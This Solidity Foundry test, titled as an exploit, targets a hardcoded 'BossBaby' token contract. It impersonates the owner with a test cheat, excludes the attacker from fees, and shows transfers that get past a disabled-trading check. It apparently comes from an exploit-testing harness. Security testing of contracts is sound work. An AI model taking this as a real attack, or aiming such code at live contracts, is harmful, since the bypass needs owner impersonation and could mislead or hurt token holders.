pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface BossBaby {
    function owner() external view returns (address);
    function excludeFromFees(address account, bool excluded) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function tradingEnabled() external view returns (bool);
    function isExcludedFromFee(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner address
        address owner = BossBaby(TARGET).owner();

        // Step 2: Impersonate the owner to call privileged functions
        vm.startPrank(owner);

        // Step 3: Exclude attacker (this contract) from fees
        // This allows attacker to bypass tradingEnabled check
        BossBaby(TARGET).excludeFromFees(attacker, true);

        // Step 4: Transfer some tokens from owner to attacker to demonstrate bypass
        // Owner has all tokens initially
        uint256 ownerBalance = BossBaby(TARGET).balanceOf(owner);
        uint256 transferAmount = ownerBalance / 100; // Transfer 1%
        BossBaby(TARGET).transfer(attacker, transferAmount);

        vm.stopPrank();

        // Step 5: Verify tradingEnabled is false (oracle requirement)
        bool tradingEnabled = BossBaby(TARGET).tradingEnabled();
        require(tradingEnabled == false, "tradingEnabled should be false");

        // Step 6: Demonstrate attacker can transfer tokens (to themselves or another address)
        // because attacker is excluded from fees
        address dummyAddress = address(0x123);
        uint256 attackerBalance = BossBaby(TARGET).balanceOf(attacker);
        if (attackerBalance > 0) {
            // Try to transfer a small amount - should succeed even with tradingEnabled = false
            BossBaby(TARGET).transfer(dummyAddress, 1);
        }

        // Step 7: Demonstrate a regular user (not excluded) cannot transfer
        // We need to create a regular user and give them tokens first
        address regularUser = address(0x456);
        vm.prank(owner);
        BossBaby(TARGET).transfer(regularUser, 1000 * 10**9); // Transfer some tokens

        // Now try to transfer as regular user - should fail
        vm.prank(regularUser);
        vm.expectRevert();
        BossBaby(TARGET).transfer(address(0x789), 100 * 10**9);

        // Verify tradingEnabled is still false
        assertEq(BossBaby(TARGET).tradingEnabled(), false, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

